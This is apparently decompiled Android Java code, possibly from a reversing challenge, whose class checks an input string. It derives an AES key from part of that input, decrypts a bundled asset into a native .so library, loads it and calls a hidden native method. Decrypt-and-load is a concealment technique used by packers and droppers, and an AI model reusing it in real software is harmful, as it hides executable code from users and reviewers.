package ooo.p1;

import java.security.MessageDigest;
import java.security.spec.AlgorithmParameterSpec;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;
import java.nio.file.Files;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import android.content.Context;

public class P1
{
    public static String abc;
    public static String def;
    public static String ghi;
    private static final byte[] ooo;
    
    static {
        P1.abc = "smnvlwkuelqkjsmxzz";
        P1.def = "mmdffuoscjdamcnssn";
        P1.ghi = "xtszswemcwohpluqmi";
        ooo = new byte[] { 19, 55, 19, 55, 19, 55, 19, 55, 19, 55, 19, 55, 19, 55, 19, 55 };
    }
    
    public P1() {
        super();
    }
    
    public static boolean cf(final Context context, final String s) {
        try {
            final byte[] g1 = g1(s.substring(4, 44));
            cfa(context, P1.def);
            cfa(context, P1.ghi);
            dp2(context, new File(context.getFilesDir(), P1.def), g1);
            System.loadLibrary(P1.abc);
            final String xxx = new P1().xxx(s, context.getFilesDir().getAbsolutePath());
            return xxx != null && new File(xxx).isFile();
        }
        catch (Exception ex) {
            return false;
        }
    }
    
    private static File cfa(final Context context, final String child) throws Exception {
        final InputStream open = context.getAssets().open(child);
        final File file = new File(context.getFilesDir().getAbsolutePath(), child);
        final FileOutputStream fileOutputStream = new FileOutputStream(file);
        final byte[] array = new byte[1024];
        while (true) {
            final int read = open.read(array);
            if (read == -1) {
                break;
            }
            fileOutputStream.write(array, 0, read);
        }
        open.close();
        fileOutputStream.close();
        return file;
    }
    
    private static void cff(final File file, final File file2) throws Exception {
        final FileInputStream fileInputStream = new FileInputStream(file);
        final FileOutputStream fileOutputStream = new FileOutputStream(file2);
        final byte[] array = new byte[1024];
        while (true) {
            final int read = fileInputStream.read(array);
            if (read == -1) {
                break;
            }
            fileOutputStream.write(array, 0, read);
        }
        fileInputStream.close();
        fileOutputStream.close();
    }
    
    private static File dp2(final Context context, final File file, byte[] array) throws Exception {
        final byte[] hash = hash(array);
        array = Files.readAllBytes(file.toPath());
        try {
            final IvParameterSpec params = new IvParameterSpec(P1.ooo);
            final SecretKeySpec key = new SecretKeySpec(hash, "AES");
            final Cipher instance = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            instance.init(2, key, params);
            array = instance.doFinal(array);
            final File filesDir = context.getFilesDir();
            final StringBuilder sb = new StringBuilder();
            sb.append("lib");
            sb.append(P1.abc);
            sb.append(".so");
            final File file2 = new File(filesDir, sb.toString());
            final FileOutputStream fileOutputStream = new FileOutputStream(file2);
            fileOutputStream.write(array, 0, array.length);
            fileOutputStream.flush();
            fileOutputStream.close();
            return file2;
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    public static byte[] g1(final String s) {
        final byte[] array = new byte[4];
        final byte[] bytes = s.getBytes();
        for (int i = 0; i < 4; ++i) {
            array[i] = 0;
        }
        for (int j = 0; j < 10; j += 2) {
            for (int k = 0; k < 4; ++k) {
                array[k] ^= bytes[(j + 1) * 4 + k];
            }
        }
        return array;
    }
    
    public static byte[] hash(final byte[] input) throws Exception {
        final MessageDigest instance = MessageDigest.getInstance("MD5");
        instance.update(input);
        return instance.digest();
    }
    
    private native String xxx(final String p0, final String p1);
}
